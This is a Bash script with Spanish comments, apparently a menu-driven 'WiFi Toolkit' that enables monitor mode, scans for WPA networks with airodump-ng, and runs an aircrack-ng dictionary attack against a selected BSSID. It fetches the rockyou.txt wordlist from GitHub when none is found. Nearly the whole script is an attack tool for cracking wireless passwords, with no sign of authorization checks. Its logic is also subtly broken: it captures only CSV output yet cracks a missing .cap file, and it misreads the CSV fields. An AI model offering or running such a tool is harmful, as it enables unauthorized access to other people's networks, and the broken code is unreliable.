#!/bin/bash

# Colores para la salida
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[0;33m'
ORANGE='\033[1;33m'
WHITE='\033[1;37m'
NC='\033[0m' # Sin color

# Configuración del proyecto
PROJECT_NAME="wifi_toolkit_v2"
DOWNLOADS_DIR="$HOME/Downloads"
PROJECT_DIR="$DOWNLOADS_DIR/$PROJECT_NAME"
RESULTS_DIR="$PROJECT_DIR/resultados_wifi"
DEPENDENCIES=("aircrack-ng" "xterm" "iw" "curl" "gzip" "hashcat" "hcxpcapngtool" "dialog")

# Función para instalar dependencias
install_dependencies() {
    dialog --title "Dependencias" --msgbox "Verificando dependencias necesarias..." 8 40
    for dep in "${DEPENDENCIES[@]}"; do
        if ! command -v "$dep" &>/dev/null; then
            dialog --title "Instalando Dependencia" --infobox "Instalando $dep..." 8 40
            sudo apt-get install -y "$dep" &>/dev/null || {
                dialog --title "Error" --msgbox "Error al instalar $dep. Instálalo manualmente." 8 40
                exit 1
            }
        fi
    done
    dialog --title "Dependencias" --msgbox "Todas las dependencias están instaladas." 8 40
}

# Buscar hardware compatible
find_monitor_hardware() {
    dialog --title "Hardware Compatible" --infobox "Buscando hardware compatible..." 8 40
    sleep 2
    interface=$(iw dev | grep Interface | awk '{print $2}' | head -n 1)
    if [[ -z "$interface" ]]; then
        dialog --title "Error" --msgbox "No se encontró hardware compatible." 8 40
        exit 1
    fi
    dialog --title "Hardware Compatible" --yesno "Se encontró el hardware $interface. ¿Deseas habilitar el modo monitor?" 10 50
    response=$?
    if [[ $response -eq 0 ]]; then
        airmon-ng start "$interface" &>/dev/null || iw dev "$interface" set type monitor
        dialog --title "Modo Monitor" --msgbox "Modo monitor habilitado en $interface." 8 40
    else
        dialog --title "Modo Monitor" --msgbox "Modo monitor no habilitado." 8 40
    fi
}

# Escanear redes WiFi
display_networks() {
    interface=$(iw dev | grep Interface | awk '{print $2}' | head -n 1)
    if [[ -z "$interface" ]]; then
        dialog --title "Error" --msgbox "No se encontró hardware compatible." 8 40
        exit 1
    fi

    dialog --title "Escaneo" --infobox "Escaneando redes WiFi durante 60 segundos..." 8 40
    xterm -hold -e "airodump-ng $interface --output-format csv --write $RESULTS_DIR/networks" &
    sleep 60
    killall airodump-ng

    csv_file="$RESULTS_DIR/networks-01.csv"
    if [[ -f "$csv_file" ]]; then
        format_and_display_networks "$csv_file"
    else
        dialog --title "Error" --msgbox "No se encontraron redes." 8 40
    fi
}

# Formatear y mostrar redes
format_and_display_networks() {
    local csv_file=$1
    networks=$(awk -F"," '{if ($9 ~ /WPA/) printf "%s %s\n", $14, $9}' "$csv_file" | sed 's/^ //g')

    options=()
    index=1
    while IFS= read -r line; do
        pwr=$(echo "$line" | awk '{print $1}')
        bssid=$(echo "$line" | awk '{print $2}')

        if ((pwr > -30)); then
            options+=($index "\${GREEN} $line \${NC}")
        elif ((pwr > -50)); then
            options+=($index "\${ORANGE} $line \${NC}")
        else
            options+=($index "\${RED} $line \${NC}")
        fi
        ((index++))
    done <<< "$networks"

    selection=$(dialog --title "Redes Encontradas" --menu "Selecciona una red para analizar:" 20 60 10 "${options[@]}" 3>&1 1>&2 2>&3)
    if [[ -n "$selection" ]]; then
        selected_line=$(echo "$networks" | sed -n "${selection}p")
        bssid=$(echo "$selected_line" | awk '{print $2}')
        attack_network "$bssid"
    else
        dialog --title "Redes" --msgbox "No se seleccionó ninguna red." 8 40
    fi
}

# Realizar ataque
attack_network() {
    local bssid=$1
    dialog --title "Ataque" --infobox "Iniciando ataque contra la red $bssid..." 8 40
    dictionary=$(find_or_download_dictionary)
    xterm -hold -e "aircrack-ng -w $dictionary -b $bssid $RESULTS_DIR/networks*.cap" &
}

# Descargar diccionario
find_or_download_dictionary() {
    local dictionary_path=$(find / -type f -name "rockyou.txt" 2>/dev/null | head -n 1)
    if [[ -z "$dictionary_path" ]]; then
        dialog --title "Diccionario" --infobox "Descargando diccionario rockyou.txt..." 8 40
        curl -o "$PROJECT_DIR/rockyou.txt.gz" https://github.com/praetorian-inc/Hob0Rules/raw/master/wordlists/rockyou.txt.gz
        gzip -d "$PROJECT_DIR/rockyou.txt.gz"
        dictionary_path="$PROJECT_DIR/rockyou.txt"
    fi
    echo "$dictionary_path"
}

# Menú principal
main_menu() {
    while true; do
        option=$(dialog --title "WiFi Toolkit 2.0" --menu "Selecciona una opción:" 20 60 10 \
            1 "Instalar dependencias" \
            2 "Buscar hardware compatible" \
            3 "Escanear redes WiFi" \
            4 "Salir" 3>&1 1>&2 2>&3)

        case $option in
            1) install_dependencies ;;
            2) find_monitor_hardware ;;
            3) display_networks ;;
            4) clear; exit 0 ;;
            *) dialog --title "Error" --msgbox "Opción inválida." 8 40 ;;
        esac
    done
}

# Crear directorios y ejecutar
mkdir -p "$RESULTS_DIR"
main_menu
